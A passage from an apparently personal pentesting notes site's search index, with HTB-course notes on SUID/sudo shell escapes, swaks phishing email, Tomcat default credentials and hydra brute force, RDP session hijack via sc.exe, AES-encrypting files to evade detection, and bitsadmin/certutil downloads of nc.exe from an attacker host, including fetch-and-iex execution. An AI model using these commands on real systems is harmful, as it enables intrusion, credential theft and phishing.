google\n</code></pre>","tags":["scanning","subdomains","reconnaissance","pentesting"]},{"location":"suid-binaries/","title":"Suid binaries","text":"<p>Resources: https://gtfobins.github.io/ contains a list of commands and how they can be exploited through \"sudo\". </p> <p>Equivalent to suid binaries in Windows would be: LOLBAS</p>","tags":["pentesting","privilege escalation","linux"]},{"location":"suid-binaries/#most-used-by-me","title":"Most used (by me)","text":"","tags":["pentesting","privilege escalation","linux"]},{"location":"suid-binaries/#find","title":"find","text":"","tags":["pentesting","privilege escalation","linux"]},{"location":"suid-binaries/#shell","title":"Shell","text":"<p>It can be used to break out from restricted environments by spawning an interactive system shell.</p> <pre><code>find . -exec /bin/sh \\; -quit\n</code></pre>","tags":["pentesting","privilege escalation","linux"]},{"location":"suid-binaries/#suid","title":"SUID","text":"<p>If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (&lt;= Stretch) that allow the default sh shell to run with SUID privileges.</p> <p>This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.</p> <pre><code>sudo install -m =xs $(which find) .\n\n./find . -exec /bin/sh -p \\; -quit\n</code></pre>","tags":["pentesting","privilege escalation","linux"]},{"location":"suid-binaries/#sudo","title":"Sudo","text":"<p>If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.</p> <pre><code>sudo find . -exec /bin/sh \\; -quit\n</code></pre>","tags":["pentesting","privilege escalation","linux"]},{"location":"suid-binaries/#vi","title":"vi","text":"","tags":["pentesting","privilege escalation","linux"]},{"location":"suid-binaries/#shell_1","title":"Shell","text":"<p>It can be used to break out from restricted environments by spawning an interactive system shell.</p> <p><pre><code>#one way\nvi -c ':!/bin/sh' /dev/null\n\n# another way\nvi\n:set shell=/bin/sh\n:shell\n</code></pre> Used at HTB machine Vaccine.</p>","tags":["pentesting","privilege escalation","linux"]},{"location":"suid-binaries/#sudo_1","title":"Sudo","text":"<p>If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.</p> <pre><code>sudo vi -c ':!/bin/sh' /dev/null\n</code></pre>","tags":["pentesting","privilege escalation","linux"]},{"location":"suid-binaries/#php","title":"php","text":"","tags":["pentesting","privilege escalation","linux"]},{"location":"suid-binaries/#sudo_2","title":"Sudo","text":"<p>If the binary is allowed to run as superuser by\u00a0sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.</p> <ul> <li><code>CMD=\"/bin/sh\"     sudo php -r \"system('$CMD');\"</code></li> </ul>","tags":["pentesting","privilege escalation","linux"]},{"location":"swaks/","title":"Swaks","text":"<p>Swaks - Swiss Army Knife SMTP, the all-purpose SMTP transaction tester.     Swaks' primary design goal is to be a flexible, scriptable, transaction-oriented SMTP test tool.  It handles SMTP features and extensions such as TLS, authentication, and pipelining; multiple version of the SMTP protocol including SMTP, ESMTP, and LMTP; and multiple transport methods including UNIX-domain sockets, internet-domain sockets, and pipes to spawned processes.  Options can be specified in environment variables, configuration files, and the command line allowing maximum configurability and ease of use for operators and scripters.</p>","tags":["pentesting","tools","SMTP","server"]},{"location":"swaks/#basic-commands","title":"Basic commands","text":"<p>Next, we can use any mail client to connect to the mail server and send our email.</p> <pre><code>swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server $ipSMTPServerVictim\n</code></pre>","tags":["pentesting","tools","SMTP","server"]},{"location":"sys-internals-suite/","title":"SysInternals Suite","text":"<p>To download: https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite.</p> <p>The Windows Sysinternals website was created in 1996 by\u00a0Mark Russinovich\u00a0and\u00a0Bryce Cogswell\u00a0to offers technical resources and utilities to manage, diagnose, troubleshoot, and monitor a Microsoft Windows environment. Microsoft acquired Windows Sysinternals and its assets on July 18, 2006.</p>","tags":["windows","thick applications"]},{"location":"sys-internals-suite/#tpcview","title":"TPCView","text":"<p>Application that allows you to see incoming and outcoming network connections associated to their application.</p> <p>In the course \"Mastering Thick Application Pentesting\" this is really helpfil to check the conections of the vulnerable applicaiton DVTA.</p>","tags":["windows","thick applications"]},{"location":"sys-internals-suite/#process-monitor","title":"Process Monitor","text":"<p>This tools helps us understand File System changes and what is being accessed in the file system.</p>","tags":["windows","thick applications"]},{"location":"sys-internals-suite/#strings","title":"Strings","text":"<p>It's similar to the command \"strings\" in bash. It displays all the human readable strings in a binary.  Usage:</p> <pre><code>strings.exe &lt;binaryFile&gt;\n</code></pre>","tags":["windows","thick applications"]},{"location":"sys-internals-suite/#sigcheck","title":"Sigcheck","text":"<p>Sigcheck is a command-line utility that shows file version number, timestamp information, and digital signature details, including certificate chains.</p> <pre><code>.\\sigcheck.exe -nobanner -s -e &lt;folder/binaryFile&gt;\n# -s: Search recursively, useful for thick client apps with lot of folders and subfolders\n# -e: Scan executable images only (regardless of their extension)\n# -nobanner:    Do not display the startup banner and copyright message.\n</code></pre>","tags":["windows","thick applications"]},{"location":"sys-internals-suite/#psexec","title":"PsExec","text":"<p>PsExec\u00a0is a tool that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually. It works because it has a Windows service image inside of its executable. </p> <p>It takes this service and deploys it to the admin$ share (by default) on the remote machine. It then uses the DCE/RPC interface over SMB to access the Windows Service Control Manager API. Next, it starts the PSExec service on the remote machine. The PSExec service then creates a\u00a0named pipe\u00a0that can send commands to the system.</p>","tags":["windows","thick applications"]},{"location":"sys-internals-suite/#psexec-for-escalating-privileges-this-method-no-longer-works-on-server-2019","title":"PsExec for escalating privileges: This method no longer works on Server 2019","text":"<p>PsExec is particularly effective for privilege escalation because it can create and run processes with SYSTEM privileges, even if executed from an Administrator account. Here\u2019s how this process typically works:</p> <ul> <li>Command Execution as SYSTEM: When using PsExec with the <code>-s</code> flag (e.g., <code>psexec -s cmd.exe</code>), it launches a process that runs with SYSTEM privileges instead of the Administrator privileges of the account running it.</li> <li>How It Works Internally: PsExec does this by leveraging Windows services, which typically run as SYSTEM by default. PsExec creates a temporary service on the machine to launch a command or program with SYSTEM privileges, then removes the service after completion.</li> <li>Escalation Path: Once PsExec launches a command prompt or other executable with SYSTEM privileges, the user essentially has unrestricted access. This enables them to perform actions that would other</li> </ul> <p>Example of an exploitation: creating a service that will run as SYSTEM</p> <pre><code>query user\n</code></pre> <p>Results:</p> <pre><code> USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME\n&gt;juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM\n lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM\n</code></pre> <pre><code>sc.exe create Nameofservice binpath= \"cmd.exe /k tscon 2 /dest:rdp-tcp#13\"\n</code></pre> <p>Explanation: Create a Windows service that, by default, run as\u00a0<code>Local System</code>\u00a0and will execute any binary with\u00a0<code>SYSTEM</code>\u00a0privileges. We use\u00a0Microsoft sc.exe\u00a0binary. First, we specify the service name (<code>Nameofservice</code>) and the\u00a0<code>binpath</code>, which is the command we want to execute. Once we run the following command, a service named\u00a0<code>Nameofservice</code>\u00a0will be created.</p> <p>Initiate the service:</p> <pre><code>net start Nameofservice\n</code></pre> <p>Once the service is started, a new terminal with the\u00a0<code>lewen</code>\u00a0user session will appear. With this new account, we can attempt to discover what kind of privileges it has on the network, and maybe we'll get lucky, and the user is a member of the Help Desk group with admin rights to many hosts or even a Domain Admin.</p>","tags":["windows","thick applications"]},{"location":"tcpdump/","title":"tcpdump - A\u00a0command-line packet analyzer","text":"<p>It dumps  all tcp connections from a .pcap file. Also tcpdump  prints out a description of the contents of packets on a network interface that match the Boolean        expression</p>","tags":["pentesting","reconnaissance"]},{"location":"tcpdump/#installation","title":"Installation","text":"<p>https://www.tcpdump.org/</p>","tags":["pentesting","reconnaissance"]},{"location":"tcpdump/#usage","title":"Usage","text":"<pre><code>tcpdump -nntttAr &lt;nameOfFile.pcap&gt; \n\n# Exit after receiving count packets.\n-c count\n\n# Save the packet data to a file for later analysis\n-w \n\n# Read  from  a saved  packet  file\n-r\n\n# Print out all captured packages\n-A\n</code></pre>","tags":["pentesting","reconnaissance"]},{"location":"the-harvester/","title":"The Harvester - A tool for pasive and active reconnaissance","text":"<p>The Harvester: simple-to-use yet powerful and effective tool for early-stage penetration testing and red team engagements. We can use it to gather information to help identify a company's attack surface. The tool collects <code>emails</code>, <code>names</code>, <code>subdomains</code>, <code>IP addresses</code>, and <code>URLs</code> from various public data sources for passive information gathering. It has modules. </p> <p>Automate the modules we want to launch:</p> <p>1. Create a list of sources, one per line, sources.txt.</p> <p>2. Execute:</p> <pre><code> cat sources.txt | while read source; do theHarvester -d \"${TARGET}\" -b $source -f \"${source}_${TARGET}\";done\n</code></pre> <p>3. When the process finishes, extract all the subdomains found and sort them:</p> <pre><code>cat *.json | jq -r '.hosts[]' 2&gt;/dev/null | cut -d':' -f 1 | sort -u &gt; \"${TARGET}_theHarvester.txt\"\n</code></pre> <p>4. Merge all the passive reconnaissance files:</p> <pre><code>cat facebook.com_*.txt | sort -u &gt; facebook.com_subdomains_passive.txt\n$ cat facebook.com_subdomains_passive.txt | wc -l\n</code></pre>","tags":["pentesting","reconnaissance","tools"]},{"location":"tmux/","title":"Tmux - A terminal multiplexer","text":"","tags":["pentesting","terminal","shells"]},{"location":"tmux/#installation","title":"Installation","text":"<pre><code>sudo apt install tmux -y\n</code></pre>","tags":["pentesting","terminal","shells"]},{"location":"tmux/#basic-usage","title":"Basic usage","text":"<p>start new:</p> <pre><code>tmux\n</code></pre> <p>start new with session name:</p> <pre><code>tmux new -s myname\n</code></pre> <p>attach:</p> <pre><code>tmux a  #  (or at, or attach)\n</code></pre> <p>attach to named:</p> <pre><code>tmux a -t myname\n</code></pre> <p>list sessions:</p> <pre><code>tmux ls\n</code></pre> <p>kill session:</p> <pre><code>tmux kill-session -t myname\n</code></pre> <p>Kill all the tmux sessions:</p> <pre><code>tmux ls | grep : | cut -d. -f1 | awk '{print substr($1, 0, length($1)-1)}' | xargs kill\n</code></pre> <p>In tmux, hit the prefix <code>ctrl+b</code> (my modified prefix is ctrl+a) and then:</p> <p>List all shortcuts</p>","tags":["pentesting","terminal","shells"]},{"location":"tomcat-pentesting/","title":"Pentesting tomcat","text":"<p>Usually found on port 8080.</p> <p>Default credentials:</p> <pre><code>admin:admin\ntomcat:tomcat\nadmin:&lt;NOTHING&gt;\nadmin:s3cr3t\ntomcat:s3cr3t\nadmin:tomcat\ntomcat:tomca\n</code></pre> <p>Dictionaries:</p>","tags":["web pentesting","techniques"]},{"location":"tomcat-pentesting/#directory-enumeration","title":"Directory enumeration","text":"","tags":["web pentesting","techniques"]},{"location":"tomcat-pentesting/#brute-force","title":"Brute force","text":"<pre><code>hydra -l tomcat -P /usr/share/wordlists/SecLists-master/Passwords/darkweb2017-top1000.txt -f $ip http-get /manager/html \n</code></pre>","tags":["web pentesting","techniques"]},{"location":"transferring-files-evading-detection/","title":"Evading detection in file transfers","text":"<p>Encrypting the data or files before a transfer is often necessary to prevent the data from being read if intercepted in transit.</p>","tags":["evading detection","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-evading-detection/#windows","title":"Windows","text":"","tags":["evading detection","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-evading-detection/#file-encryption-on-windows-invoke-aesencryptionps1","title":"File Encryption on Windows: Invoke-AESEncryption.ps1","text":"<p>Download it from: https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1 Also, see the code snippet below.</p> <pre><code>&lt;#  \n.SYNOPSIS  \nEncryptes or Decrypts Strings or Byte-Arrays with AES  \n\u00a0  \n.DESCRIPTION  \nTakes a String or File and a Key and encrypts or decrypts it with AES256 (CBC)  \n\u00a0  \n.PARAMETER Mode  \nEncryption or Decryption Mode  \n\u00a0  \n.PARAMETER Key  \nKey used to encrypt or decrypt  \n\u00a0  \n.PARAMETER Text  \nString value to encrypt or decrypt  \n\u00a0  \n.PARAMETER Path  \nFilepath for file to encrypt or decrypt  \n\u00a0  \n.EXAMPLE  \nInvoke-AESEncryption -Mode Encrypt -Key \"p@ssw0rd\" -Text \"Secret Text\"  \n\u00a0  \nDescription  \n-----------  \nEncrypts the string \"Secret Test\" and outputs a Base64 encoded cipher text.  \n\u00a0  \n.EXAMPLE  \nInvoke-AESEncryption -Mode Decrypt -Key \"p@ssw0rd\" -Text \"LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=\"  \n\u00a0  \nDescription  \n-----------  \nDecrypts the Base64 encoded string \"LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=\" and outputs plain text.  \n\u00a0  \n.EXAMPLE  \nInvoke-AESEncryption -Mode Encrypt -Key \"p@ssw0rd\" -Path file.bin  \n\u00a0  \nDescription  \n-----------  \nEncrypts the file \"file.bin\" and outputs an encrypted file \"file.bin.aes\"  \n\u00a0  \n.EXAMPLE  \nInvoke-AESEncryption -Mode Encrypt -Key \"p@ssw0rd\" -Path file.bin.aes  \n\u00a0  \nDescription  \n-----------  \nDecrypts the file \"file.bin.aes\" and outputs an encrypted file \"file.bin\"  \n#&gt;  \nfunction\u00a0Invoke-AESEncryption\u00a0{  \n\u00a0\u00a0\u00a0\u00a0[CmdletBinding()]  \n\u00a0\u00a0\u00a0\u00a0[OutputType([string])]  \n\u00a0\u00a0\u00a0\u00a0Param  \n\u00a0\u00a0\u00a0\u00a0(  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[Parameter(Mandatory\u00a0=\u00a0$true)]  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[ValidateSet('Encrypt',\u00a0'Decrypt')]  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[String]$Mode,  \n\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[Parameter(Mandatory\u00a0=\u00a0$true)]  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[String]$Key,  \n\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[Parameter(Mandatory\u00a0=\u00a0$true,\u00a0ParameterSetName\u00a0=\u00a0\"CryptText\")]  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[String]$Text,  \n\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[Parameter(Mandatory\u00a0=\u00a0$true,\u00a0ParameterSetName\u00a0=\u00a0\"CryptFile\")]  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[String]$Path  \n\u00a0\u00a0\u00a0\u00a0)  \n\n\u00a0\u00a0\u00a0\u00a0Begin\u00a0{  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0$shaManaged\u00a0=\u00a0New-Object\u00a0System.Security.Cryptography.SHA256Managed  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0$aesManaged\u00a0=\u00a0New-Object\u00a0System.Security.Cryptography.AesManaged  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0$aesManaged.Mode\u00a0=\u00a0[System.Security.Cryptography.CipherMode]::CBC  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0$aesManaged.Padding\u00a0=\u00a0[System.Security.Cryptography.PaddingMode]::Zeros  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0$aesManaged.BlockSize\u00a0=\u00a0128  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0$aesManaged.KeySize\u00a0=\u00a0256  \n\u00a0\u00a0\u00a0\u00a0}  \n\n\u00a0\u00a0\u00a0\u00a0Process\u00a0{  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0$aesManaged.Key\u00a0=\u00a0$shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))  \n\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0switch\u00a0($Mode)\u00a0{  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Encrypt'\u00a0{  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if\u00a0($Text)\u00a0{$plainBytes\u00a0=\u00a0[System.Text.Encoding]::UTF8.GetBytes($Text)}  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if\u00a0($Path)\u00a0{  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0$File\u00a0=\u00a0Get-Item\u00a0-Path\u00a0$Path\u00a0-ErrorAction\u00a0SilentlyContinue  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if\u00a0(!$File.FullName)\u00a0{  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Write-Error\u00a0-Message\u00a0\"File not found!\"  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0break  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0$plainBytes\u00a0=\u00a0[System.IO.File]::ReadAllBytes($File.FullName)  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0$outPath\u00a0=\u00a0$File.FullName\u00a0+\u00a0\".aes\"  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \n\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0$encryptor\u00a0=\u00a0$aesManaged.CreateEncryptor()  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0$encryptedBytes\u00a0=\u00a0$encryptor.TransformFinalBlock($plainBytes,\u00a00,\u00a0$plainBytes.Length)  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0$encryptedBytes\u00a0=\u00a0$aesManaged.IV\u00a0+\u00a0$encryptedBytes  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0$aesManaged.Dispose()  \n\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if\u00a0($Text)\u00a0{return\u00a0[System.Convert]::ToBase64String($encryptedBytes)}  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if\u00a0($Path)\u00a0{  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[System.IO.File]::WriteAllBytes($outPath,\u00a0$encryptedBytes)  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0(Get-Item\u00a0$outPath).LastWriteTime\u00a0=\u00a0$File.LastWriteTime  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return\u00a0\"File encrypted to $outPath\"  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \n\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Decrypt'\u00a0{  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if\u00a0($Text)\u00a0{$cipherBytes\u00a0=\u00a0[System.Convert]::FromBase64String($Text)}  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if\u00a0($Path)\u00a0{  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0$File\u00a0=\u00a0Get-Item\u00a0-Path\u00a0$Path\u00a0-ErrorAction\u00a0SilentlyContinue  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if\u00a0(!$File.FullName)\u00a0{  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Write-Error\u00a0-Message\u00a0\"File not found!\"  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0break  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0$cipherBytes\u00a0=\u00a0[System.IO.File]::ReadAllBytes($File.FullName)  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0$outPath\u00a0=\u00a0$File.FullName\u00a0-replace\u00a0\".aes\"  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \n\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0$aesManaged.IV\u00a0=\u00a0$cipherBytes[0..15]  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0$decryptor\u00a0=\u00a0$aesManaged.CreateDecryptor()  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0$decryptedBytes\u00a0=\u00a0$decryptor.TransformFinalBlock($cipherBytes,\u00a016,\u00a0$cipherBytes.Length\u00a0-\u00a016)  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0$aesManaged.Dispose()  \n\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if\u00a0($Text)\u00a0{return\u00a0[System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if\u00a0($Path)\u00a0{  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[System.IO.File]::WriteAllBytes($outPath,\u00a0$decryptedBytes)  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0(Get-Item\u00a0$outPath).LastWriteTime\u00a0=\u00a0$File.LastWriteTime  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return\u00a0\"File decrypted to $outPath\"  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \n\u00a0\u00a0\u00a0\u00a0}  \n\n\u00a0\u00a0\u00a0\u00a0End\u00a0{  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0$shaManaged.Dispose()  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0$aesManaged.Dispose()  \n\u00a0\u00a0\u00a0\u00a0}  \n}\n</code></pre> <p>After the script has been transferred, it only needs to be imported as a module, as shown below.</p> <pre><code>Import-Module .\\Invoke-AESEncryption.ps1\n</code></pre> <p>This command creates an encrypted file with the same name as the encrypted file but with the extension \"<code>.aes</code>.\"</p> <pre><code>Invoke-AESEncryption -Mode Encrypt -Key \"p4ssw0rd\" -Path .\\scan-results.txt\n</code></pre>","tags":["evading detection","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-evading-detection/#bitsadmin","title":"Bitsadmin","text":"<p>The\u00a0Background Intelligent Transfer Service (BITS)\u00a0can be used to download files from HTTP sites and SMB shares. It \"intelligently\" checks host and network utilization into account to minimize the impact on a user's foreground work.</p> <p>Download a file:</p> <pre><code>PS C:\\htb&gt; bitsadmin /transfer wcb /priority foreground http://$ipAttacker:$portAttacker/nc.exe C:\\Users\\htb-student\\Desktop\\nc.exe\n</code></pre> <pre><code>PS C:\\htb&gt; Import-Module bitstransfer;\nPS C:\\htb&gt; Start-BitsTransfer 'http://$ipAttacker:$portAttacker/nc.exe' $env:temp\\t;\nPS C:\\htb&gt; $r=gc $env:temp\\t;\nPS C:\\htb&gt; rm $env:temp\\t; \nPS C:\\htb&gt; iex $r\n</code></pre>","tags":["evading detection","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-evading-detection/#certutil","title":"Certutil","text":"<p>Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto wget for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.</p> <p>Download a file:</p> <pre><code>C:\\htb&gt; certutil.exe -verifyctl -split -f http://$ipAttacker:$portAttacker/nc.exe\n\nC:\\htb&gt; certutil -urlcache -split -f http://$ipAttacker:$portAttacker/nc.exe \nC:\\htb&gt; certutil -verifyctl -split -f 